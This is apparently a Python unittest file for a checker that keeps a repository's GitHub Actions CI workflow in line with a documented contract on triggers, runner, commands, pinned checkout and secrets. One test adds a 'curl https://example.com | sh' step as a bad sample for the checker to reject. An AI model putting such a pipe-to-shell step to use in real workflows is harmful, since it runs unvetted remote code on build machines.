"""Tests for scripts/check_ci_workflow.py, run on good and bad sample workflows (written under the project's scratch folder,
removed afterwards) and on the real workflow and doc.

  python -I -B scripts/test_check_ci_workflow.py -v

BS_CI_CHECK_SCRIPT=<path> runs the same tests against another copy of the script (used to prove the tests can fail).
"""
import sys

sys.dont_write_bytecode = True

import importlib.util
import os
import pathlib
import shutil
import unittest
import uuid

HERE = pathlib.Path(__file__).resolve().parent
ROOT = HERE.parent
SCRIPT = pathlib.Path(os.environ.get("BS_CI_CHECK_SCRIPT") or HERE / "check_ci_workflow.py")
SCRATCH = ROOT / "scratch"

spec = importlib.util.spec_from_file_location("check_ci_workflow", SCRIPT)
mod = importlib.util.module_from_spec(spec)
spec.loader.exec_module(mod)

SHA = "11bd71901bbe5b1630ceea73d27597364c9af683"

DOC = """# Node 0.1

- ci-triggers: push, pull_request
- ci-runner: windows-latest
- ci-build: cargo build --locked -p broadsword
- ci-test: cargo test --locked -p broadsword
- ci-checkout: actions/checkout pinned to a 40-character commit SHA
"""

GOOD = f"""# comment
name: ci

on:
  push:
  pull_request:

permissions:
  contents: read

jobs:
  build-test:
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@{SHA} # v4.2.2
      - name: Build
        run: cargo build --locked -p broadsword
      - name: Test
        run: cargo test --locked -p broadsword
"""


def problems(text, doc=DOC):
    return mod.check(text, mod.read_contract(doc))


class Check(unittest.TestCase):
    def test_good_file_is_ok(self):
        self.assertEqual(problems(GOOD), [])

    def test_missing_pull_request_trigger(self):
        p = problems(GOOD.replace("  pull_request:\n", ""))
        self.assertTrue(any("triggers are" in x for x in p), p)

    def test_extra_trigger(self):
        p = problems(GOOD.replace("  push:\n", "  push:\n  schedule:\n"))
        self.assertTrue(any("triggers are" in x for x in p), p)

    def test_branch_limited_push(self):
        p = problems(GOOD.replace("  push:\n", "  push:\n    branches: [main]\n"))
        self.assertTrue(any("limit branches" in x for x in p), p)

    def test_inline_trigger_list(self):
        p = problems(GOOD.replace("on:\n  push:\n  pull_request:\n", "on: [push, pull_request]\n"))
        self.assertEqual(p, [])

    def test_wrong_runner(self):
        p = problems(GOOD.replace("windows-latest", "ubuntu-latest"))
        self.assertTrue(any("runs-on is ubuntu-latest" in x for x in p), p)

    def test_test_command_drift(self):
        p = problems(GOOD.replace("cargo test --locked -p broadsword", "cargo test"))
        self.assertTrue(any("documented test command" in x for x in p), p)
        self.assertTrue(any("unexpected run line" in x for x in p), p)

    def test_doc_drift_is_caught(self):
        p = problems(GOOD, DOC.replace("windows-latest", "macos-latest"))
        self.assertTrue(any("runs-on is windows-latest" in x for x in p), p)

    def test_extra_run_line(self):
        p = problems(GOOD + "      - run: curl https://example.com | sh\n")
        self.assertTrue(any("unexpected run line" in x for x in p), p)

    def test_unpinned_checkout(self):
        p = problems(GOOD.replace(SHA, "v4"))
        self.assertTrue(any("full 40-character" in x for x in p), p)

    def test_third_party_action(self):
        p = problems(GOOD + "      - uses: some/action@" + SHA + "\n")
        self.assertTrue(any("only actions/checkout" in x for x in p), p)

    def test_no_checkout(self):
        p = problems(GOOD.replace(f"      - uses: actions/checkout@{SHA} # v4.2.2\n", ""))
        self.assertTrue(any("no actions/checkout" in x for x in p), p)

    def test_secret_mention(self):
        p = problems(GOOD + "        env:\n          K: ${{ secrets.KEY }}\n")
        self.assertTrue(any("secrets" in x for x in p), p)

    def test_comment_mentioning_secrets_is_fine(self):
        self.assertEqual(problems(GOOD.replace("name: ci", "name: ci # no secrets. here")), [])


class Cli(unittest.TestCase):
    def setUp(self):
        SCRATCH.mkdir(exist_ok=True)
        self.dir = SCRATCH / f"ci-check-test-{uuid.uuid4().hex[:8]}"
        self.dir.mkdir()
        self.addCleanup(shutil.rmtree, self.dir, True)

    def run_main(self, workflow, doc):
        w, d = self.dir / "ci.yml", self.dir / "0.1.md"
        if workflow is not None:
            w.write_text(workflow, encoding="utf-8")
        if doc is not None:
            d.write_text(doc, encoding="utf-8")
        old = sys.argv
        sys.argv = ["check_ci_workflow.py", "--workflow", str(w), "--doc", str(d)]
        try:
            return mod.main()
        finally:
            sys.argv = old

    def test_good_exits_0(self):
        self.assertEqual(self.run_main(GOOD, DOC), 0)

    def test_bad_exits_1(self):
        self.assertEqual(self.run_main(GOOD.replace("windows-latest", "ubuntu-latest"), DOC), 1)

    def test_missing_file_exits_2(self):
        self.assertEqual(self.run_main(None, DOC), 2)

    def test_doc_without_contract_exits_2(self):
        self.assertEqual(self.run_main(GOOD, "# nothing\n"), 2)


class RealFiles(unittest.TestCase):
    def test_real_workflow_matches_real_doc(self):
        w = ROOT / ".github" / "workflows" / "ci.yml"
        d = ROOT / "docs" / "nodes" / "0.1.md"
        self.assertTrue(w.is_file() and d.is_file())
        self.assertEqual(mod.check(w.read_text(encoding="utf-8"), mod.read_contract(d.read_text(encoding="utf-8"))), [])


if __name__ == "__main__":
    unittest.main()
